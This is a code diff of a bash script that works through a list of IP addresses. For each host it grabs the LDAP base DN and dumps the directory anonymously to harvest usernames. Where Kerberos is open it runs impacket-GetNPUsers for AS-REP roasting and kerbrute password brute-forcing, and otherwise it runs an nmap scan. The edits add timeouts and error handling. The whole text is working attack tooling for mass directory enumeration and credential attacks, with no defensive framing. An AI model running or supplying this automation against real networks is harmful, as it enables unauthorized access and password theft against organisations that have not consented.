@@ -3,10 +3,10 @@ for line in $(cat iplist)
 do
 
 #Get DN
+DN=$(timeout 3 python3 getdn.py $line 2>/dev/null | grep -i "dc=" | head -n 1 | cut -d " " -f 5 )
+DN=$(echo "$DN" | tr '[:upper:]' '[:lower:]')
 
-DN=$(timeout 3 python3 getdn.py $line 2> /dev/null | grep "dc=" | head -n 1 | cut -d " " -f 5 )
-
-#If no DN skip
+#If DN Grabbed
 if [[ ! -z "$DN" ]];then
 echo "=============== [Info] ==============="
 echo $line
@@ -20,6 +20,11 @@ echo $url
 #Full dump
 dump=$(timeout 3 ldapsearch -LLL -x -H ldap://$line -b "$DN" 2> /dev/null)
 
+if [[ -z "$dump" ]];then
+echo "Empty Dump"
+echo "======================================="
+continue
+fi
 
 #Grab Users via uid
 echo "=========== [Users via uid] ==========="
@@ -175,7 +180,7 @@ fi
 
 if [[ ! -z "$kerb_svc" ]];then
 echo "===> Kerberos Open : Impacket GetNPUsers "
-impacket-GetNPUsers -dc-ip $line $url/ -usersfile users
+timeout 60 impacket-GetNPUsers -dc-ip $line $url/ -usersfile users  || echo "I failed, perhaps due to time out"
 echo "===> Kerberos Open : Kerbrute "
 bash create_user_password_list.sh > userpass
 validuserpasskerbrute=$(/root/go/bin/kerbrute -d $url bruteforce userpass | grep "VALID LOGIN" | cut -d " " -f 8)
@@ -223,7 +228,7 @@ fi
 #Fast scan if no services found
 if [[ -z "$ssh_svc" && -z "$smtp_svc" && -z "$kerb_svc" && -z "$smb_svc" && -z "$afp_svc" && -z "$mssql_svc" && -z "$rdp_svc" ]]; then
 echo "============= [Fast Scan] ============="
-nmap $line  -F| grep open
+timeout 10 nmap $line  -F | grep open || echo "I failed, perhaps due to time out"
 fi
 
 else 
